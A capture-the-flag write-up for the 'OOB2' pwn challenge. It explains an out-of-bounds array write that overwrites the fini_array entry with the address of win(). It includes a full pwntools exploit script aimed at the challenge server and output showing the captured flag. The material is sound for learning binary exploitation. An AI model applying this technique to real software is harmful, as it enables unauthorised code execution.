# Access Denied: Pwn/OOB2

## Question 

There is a subtle difference here.

server: nc 34.71.207.70 9337

[oob2](oob2.bin)

## Solution

Not too much different than the previous one. Wwe'll just need to overwrite the ``_fini_array`` with the address of the ``win()`` function.

```python
offset=(e.sym['__do_global_dtors_aux_fini_array_entry']-e.sym['arr'])/4
```

Putting our script together:

```python
from pwn import *
import sys

binary = args.BIN
context.terminal = ["tmux", "splitw", "-h"]
e = context.binary = ELF(binary)
r = ROP(e)

gs = '''
break *0x4012c4
continue
'''

def start():
    if args.GDB:
        return gdb.debug(e.path, gdbscript=gs)
    elif args.REMOTE:
        return remote('34.71.207.70',9337)
    else:
        return process(e.path,level="error")


offset=(e.sym['__do_global_dtors_aux_fini_array_entry']-e.sym['arr'])/4

p = start()
p.recvuntil(b'Enter the index:') 
p.sendline(b'%i' %offset)
p.recvuntil(b'Enter the value:')
p.sendline(b"%i" %e.sym['win'])
p.interactive()
```

Running our script yields the flag 

```
$ python3 pwn-oob2.py BIN=./oob2.bin REMOTE
[*] '/root/workspace/access_denied/_oob2/oob2.bin'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[*] Loaded 14 cached gadgets for './oob2.bin'
[+] Opening connection to 34.71.207.70 on port 9337: Done
[*] Switching to interactive mode
 accessdenied{f1n1_4rr4y5_h4s_d0n3_th3_m4g1c_155ab68a}
[*] Got EOF while reading in interactive
```

